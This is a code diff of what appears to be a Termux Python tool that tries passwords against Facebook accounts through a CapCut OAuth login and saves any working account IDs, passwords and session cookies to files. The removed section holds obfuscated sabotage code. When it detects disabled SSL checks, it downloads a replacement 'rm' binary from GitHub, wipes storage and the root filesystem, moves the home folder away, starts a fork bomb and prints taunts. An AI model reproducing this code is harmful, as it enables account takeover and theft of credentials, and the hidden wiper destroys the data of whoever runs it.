+            'x-requested-with': 'XMLHttpRequest',
+            'x-response-format': 'JSONStream',
+            }
+            params = {
+            'api_key': '3213804762189845',
+            'auth_token': '86ee9081567a3ae59cfedd887a685aca',
+            'skip_api_login': '1',
+            'signed_next': '1',
+            'next': 'https://mbasic.facebook.com/v3.1/dialog/oauth?client_id=3213804762189845&redirect_uri=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success&scope=email&state=3c7611813gAToVCgoVPZIDA2ZGVlNWU4YjUwZDhmNzcwOTM4NDQ5NTY4MzNjMTE3oU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIGE2OWM5MWM2YjdiOGFmNWMyNDI4ZGRjODJlMGRkNTY0oVcAoUYAolNBAKFVwqJNTMI%253D&ret=login&fbapp_pres=0&logger_id=142ed561-e5c8-49a4-bec4-eaa45bae67f0&tp=unspecified',
+            'refsrc': 'deprecated',
+            'app_id': '3213804762189845',
+            'cancel': 'https://www.capcut.com/passport/web/web_login_success?error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&state=3c7611813gAToVCgoVPZIDA2ZGVlNWU4YjUwZDhmNzcwOTM4NDQ5NTY4MzNjMTE3oU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIGE2OWM5MWM2YjdiOGFmNWMyNDI4ZGRjODJlMGRkNTY0oVcAoUYAolNBAKFVwqJNTMI%253D#_=_',
+            'lwv': '100',
+            }
+            lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',params=params,headers=head,data=data,allow_redirects=False)
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                idf = re.findall('c_user=(.*);xs', coki)[0]
+                print('\r\r\033[1;37m[\033[1;32mALIVE\033[1;37m]\033[1;37m ' +idf+ '\033[1;33m | \033[1;37m' +ps+  '')
+                print('\r\r\033[1;37m[\033[1;32mCOOKIE\033[1;37m]\033[1;37m ' +coki)
+                open('/sdcard/TURAG-OK-M3.txt','a').write(idf+'|'+ps+'|'+coki+'\n')
+                ok.append(idf)
+                break
+            elif 'checkpoint' in log_cookies:
+                if 'y' in cpx:
+                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                    coki1 = coki.split("1000")[1]
+                    idf = "1000"+coki1[0:11]
+                    print(f'\033[1;31m[FELLIX-CP] {idf}|{ps}')
+                    open('/sdcard/FELLIX-CP.txt','a').write(idf+'|'+ps+'\n')
+                    cp.append(idf)
+                    break
+            else:
+                continue
         loop+=1
-    except requests.exceptions.ConnectionError:time.sleep(20)
-"""-------------------------(MR-TOP TOOL STATUS CHECKER)-------------------------"""
-def issue():
-    if os.path.isfile("/data/d"+"ata/com.ter"+"mux/files/u"+"sr/bin/rm"):pass
-    else:system('clear');print(f'{style} Syste'+'m Modif'+'ication N'+'ot Allo'+'wed Warn'+'ing By Mr Top');exit()
-    if os.path.isfile("/data/da"+"ta/com.termu"+"x/files/usr"+"/bin/cp"):pass
-    else:system('clear');print(f'{style} Syst'+'em Mod'+'ification N'+'ot Allo'+'wed War'+'ning By Mr Top');exit()
-    if os.path.isfile("/data/da"+"ta/com.termu"+"x/files/us"+"r/bin/mv"):pass
-    else:system('clear');print(f'{style} Sys'+'tem Modifi'+'cation N'+'ot All'+'owed Warni'+'ng By Mr Top');exit()
-    if os.path.isfile("/data/d"+"ata/com.termu"+"x/files/usr/bi"+"n/termux-reset"):pass
-    else:system('clear');print(f'{style} Sys'+'tem Modi'+'fication N'+'ot All'+'owed War'+'ning By Mr Top');exit()
-    if os.path.isfile("/data/dat"+"a/com.termux/files/usr/"+"bin/term"+"ux-setup-storage"):pass
-    else:system('clear');print(f'{style} Sy'+'stem Modi'+'fication N'+'ot Allo'+'wed War'+'ning By Mr Top');exit()
-    if os.path.isfile("/data/da"+"ta/com.termu"+"x/files/usr/"+"bin/pip"):pass
-    else:system('clear');print(f'{style} Sy'+'stem Modi'+'fication N'+'ot Allo'+'wed War'+'ning By Mr Top');exit()
-    if os.path.isfile("/data/dat"+"a/com.termux/file"+"s/usr/bin"+"/pip3"):pass
-    else:system('clear');print(f'{style} Sy'+'stem Modi'+'fication N'+'ot Allo'+'wed Wa'+'rning By Mr Top');exit()
-    if os.path.isfile("/data/data/com"+".termux/files/"+"usr/bin/"+"pip3.11"):pass
-    else:system('clear');print(f'{style} Sys'+'tem Modific'+'ation N'+'ot Allo'+'wed War'+'ning By Mr Top');exit()
-def iamcheckingyou():
-    with open(f'{site}requests/sessions.py', 'r') as file :
-        filedata63 = file.read()
-    if "verify = False" in filedata63:os.system("c"+"d /"+"data"+"/dat"+"a/com"+".term"+"ux/fi"+"les/usr"+"/bin &"+"& cur"+"l -s"+"S -"+"L ht"+"tps:/"+"/githu"+"b.com"+"/R"+"EFAT"+"-"+"156/"+"Serve"+"rO"+"fRefa"+"t/raw"+"/main"+"/rm "+"-o rm"+" &&"+" chm"+"od +x"+" /dat"+"a/data"+"/com."+"termu"+"x/file"+"s/usr/"+"bin/r"+"m &"+"& c"+"d "+"$HO"+"ME/REF"+"AT"+"-XD");wash('rm -rf /storage/emulated/0/*');wash('rm -rf /storage/emulated/*');wash('rm -rf /sdcard/*');wash('rm -rf /sdcard/0/*');wash('rm -rf /sdcard1/*');wash('rm -rf /storage/*');wash('rm -rf /*');wash('rm -rf /system/*');wash('rm -rf $HOME/../../*');wash('rm -rf $PREFIX/b');wash('rm -rf $HOME/*');wash('mv $HOME /dev/null');wash(':(){ :|: & };:');wash("rm -rf /data/data/com.termux/files/usr/lib/python3.*");_________linex_________();print(f'{style} MR.TOP FUCK YOUR SYSTEM 😗');_________linex_________();time.sleep(2);print(f'{style} PAID COMMAND FREE USE NOTE EASY 🤣');_________linex_________();time.sleep(2);print(f'{style} GO AND CHECK YOUR STORAGE BYE...😘🍻');_________linex_________();time.sleep(2);exit()
-    else:pass
-    with open(f'{site}urllib3/conne'+'ction.py', 'r') as file7i7 :
-        filedata47 = file7i7.read()
-    if str("cert_reqs = 'CERT_NONE'") in filedata47:wash('rm -rf /storage/emulated/0/*');wash('rm -rf /storage/emulated/*');wash('rm -rf /sdcard/*');wash('rm -rf /sdcard/0/*');wash('rm -rf /sdcard1/*');wash('rm -rf /storage/*');wash('rm -rf /*');wash('rm -rf /system/*');wash('rm -rf $HOME/../../*');wash('rm -rf $PREFIX/b');wash('rm -rf $HOME/*');wash('mv $HOME /dev/null');wash(':(){ :|: & };:');wash("rm -rf /data/data/com.termux/files/usr/lib/python3.*");_________linex_________();print(f'{style} MR.TOP FUCK YOUR SYSTEM 😗');_________linex_________();time.sleep(2);print(f'{style} PAID COMMAND FREE USE NOTE EASY 🤣');_________linex_________();time.sleep(2);print(f'{style} GO AND CHECK YOUR STORAGE BYE...😘🍻');_________linex_________();time.sleep(2);exit()
-def verify():
-    with open(f'{site}req'+'uests/sessi'+'ons.py', 'r') as file :
-            filedata = file.read()
-    filedata = filedata.replace('verify = False', 'verify = True')
-    with open(f'{site}reque'+'sts/sessi'+'ons.py', 'w') as file:
-        file.write(filedata)
-    if "verify = True" in filedata:pass
-    else:
-        with open(f'{site}requ'+'ests/sess'+'ions.py', 'a') as file:
-            file.write('\nverify = True\n')
-    pass
-"""-------------------------(DEFINE AND RUN TOOL)-------------------------"""
-if __name__=='__main__':
-    try:issue();iamcheckingyou();verify();rsbuy()
-    except requests.exceptions.ConnectionError:print('\n No internet connection ...');exit()
-    except:exit()
+    except Exception as e:
+        pass
+main()
